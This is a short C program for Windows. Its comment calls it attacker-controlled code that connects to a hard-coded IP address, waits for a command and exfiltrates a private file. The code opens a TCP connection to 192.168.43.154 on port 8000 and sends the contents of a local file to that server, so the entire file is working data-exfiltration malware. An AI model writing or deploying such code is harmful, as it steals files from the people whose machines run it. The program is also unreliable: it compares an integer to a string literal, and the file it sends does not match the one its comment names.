/*This funciton initially establishes a connection with the IP address mentioned. Once established, we waits for a string from server (these would be commands the attaker wants to execute).
Opon recieving FindFirstFile command (in string format, but in reality it can be encrypted) from server, it exfiltrates contents from private_data.txt and closes connection.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>

#define DEFAULT_PORT 8000
#define DEFAULT_BUFLEN 512
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    // Create a socket for connecting to server
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Specify server address and port
    memset(&clientService, 0, sizeof(clientService));
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("192.168.43.154");
    clientService.sin_port = htons(DEFAULT_PORT);

    // Connect to server
    iResult = connect(ConnectSocket, (SOCKADDR*) &clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        printf("connect failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive FindFirstFile command from server
    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    if(iResult == "FindFirstFile")
    {
        printf("FindFirstFile correct");
    }
    if (iResult > 0) {
        printf("Received command: %s\n", recvbuf);

        // Fetch specific file
        char* filename = "example.txt";
        FILE* file = fopen(filename, "rb");
        if (file == NULL) {
            printf("Failed to open file %s\n", filename);
            closesocket(ConnectSocket);
            WSACleanup();
            return 1;
        }

        // Send file to server
        int bytes_sent = 0;
        char sendbuf[DEFAULT_BUFLEN];
        while (!feof(file)) {
            int bytes_read = fread(sendbuf, 1, DEFAULT_BUFLEN, file);
            if (bytes_read == 0) {
                break;
            }
            bytes_sent += send(ConnectSocket, sendbuf, bytes_read, 0);
        }

        printf("Sent %d bytes of file %s\n", bytes_sent, filename);
        fclose(file);
    } else if (iResult == 0) {
        printf("Connection closed\n");
    } else {
        printf("recv failed with error: %d\n", WSAGetLastError());
    }

    // Cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
